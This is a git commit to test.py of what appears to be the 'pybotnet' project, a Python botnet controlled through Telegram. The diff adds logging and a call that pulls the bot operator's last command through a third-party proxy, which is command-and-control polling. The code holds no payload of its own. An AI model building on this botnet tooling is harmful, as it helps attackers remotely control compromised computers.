c79808b2af1e6ca3ea2e4905c44ea7cfd7063919
onionj <onionj98@gmail.com>
2021-06-19 09:32:46 -0700

    testing

--- test.py
+++ test.py
@@ -1,7 +1,22 @@
 from configs import *
+import util
 import pybotnet
+import logging
 
-bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=True)
+show_log = True
 
-ans = bot.send_message_by_third_party_proxy('hi admin')
-print(ans)
+# logging:
+if show_log:
+    # show all log's
+    log_level = logging.INFO
+else:
+    # off all log's
+    log_level = 100
+my_logger = logging
+my_logger.basicConfig(level=log_level)
+logger = my_logger.getLogger('PyBotNet')
+
+
+bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=show_log)
+
+print(bot.get_last_command_by_third_party_proxy())
